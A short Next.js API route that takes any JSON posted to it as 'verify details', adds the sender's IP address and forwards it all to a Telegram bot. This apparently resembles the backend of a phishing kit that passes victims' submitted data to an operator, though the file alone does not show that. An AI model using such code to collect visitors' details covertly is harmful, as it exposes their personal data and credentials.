import { NextRequest, NextResponse } from "next/server"
import { getClientIpFromRequest } from "@/lib/client-ip"
import { telegramService } from "@/lib/telegram"

export async function POST(request: NextRequest) {
  try {
    const data = await request.json()
    const ip = getClientIpFromRequest(request)
    await telegramService.sendVerifyDetailsNotification({ ...data, ip })
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending verify details notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
